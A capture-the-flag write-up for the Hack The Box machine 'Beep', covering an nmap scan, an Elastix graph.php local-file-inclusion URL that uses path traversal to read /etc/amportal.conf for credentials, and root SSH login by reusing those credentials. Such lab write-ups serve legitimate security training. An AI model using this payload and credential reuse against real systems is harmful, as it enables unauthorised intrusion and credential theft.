---
title: "HTB Beep"
date: 2023-07-19T08:49:17Z
draft: false
---
## Info
---
Writeup for the HTB machine [Beep](https://app.hackthebox.com/machines/5).

- my os: Kali 2023.2
- my ip: 10.10.14.6
- target ip: 10.10.10.7

If you can't reach the websites hosted on port 443 and 10000 of the victim because of `SSL_ERROR_UNSUPPORTED_VERSION` in firefox:
- go to advanced settings in firefox by typing `about:config`
- set `security.tls.version.enable-deprecated` to `true` (this is not recommended for your daily-driver os!)

## Scanning
---
```
$ nmap -sV -sC 10.10.10.7 -p-
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-19 08:54 UTC
Nmap scan report for 10.10.10.7
Host is up (0.059s latency).
Not shown: 65519 closed tcp ports (conn-refused)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: TOP PIPELINING STLS IMPLEMENTATION(Cyrus POP3 server v2) USER AUTH-RESP-CODE UIDL RESP-CODES APOP EXPIRE(NEVER) LOGIN-DELAY(0)
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            876/udp   status
|_  100024  1            879/tcp   status
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: MAILBOX-REFERRALS IDLE X-NETSCAPE NO UNSELECT CHILDREN QUOTA URLAUTHA0001 LIST-SUBSCRIBED UIDPLUS RENAME OK IMAP4rev1 THREAD=ORDEREDSUBJECT Completed CONDSTORE CATENATE ANNOTATEMORE LITERAL+ STARTTLS IMAP4 ACL RIGHTS=kxte MULTIAPPEND ATOMIC LISTEXT SORT=MODSEQ SORT BINARY ID NAMESPACE THREAD=REFERENCES
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
|_http-server-header: Apache/2.2.3 (CentOS)
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_http-title: Elastix - Login page
| http-robots.txt: 1 disallowed entry 
|_/
|_ssl-date: 2023-07-19T08:59:25+00:00; 0s from scanner time.
879/tcp   open  status     1 (RPC #100024)
993/tcp   open  ssl/imap   Cyrus imapd
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
4190/tcp  open  sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
4445/tcp  open  upnotifyp?
4559/tcp  open  hylafax    HylaFAX 4.3.10
5038/tcp  open  asterisk   Asterisk Call Manager 1.1
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix
```
By surfing to https://10.10.10.7:443/ you'll see there is `Elastix` running.

By surfing to https://10.10.10.7:10000/ you'll see there is `Webmin` running.

## Gaining Access
---
By googling `elastix exploit` i found [Elastix 2.2.0 - 'graph.php' Local File Inclusion](https://www.exploit-db.com/exploits/37637).
We grab LFI path and surf to it: `https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action`
We can find the some credentials there there (AMPDBUSER and AMPDBPASS). Always check for password reuse!

Let's try them with ssh. Because there are some weak/outdated algorithms in use, we have to use some special parameters for ssh:
```
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa  root@10.10.10.7
```
and we are root :)

Now just find the flags:
```
[root@beep ~]# find / -name user.txt
/home/fanis/user.txt
[root@beep ~]# find / -name root.txt
/root/root.txt
```
Happy hacking :)
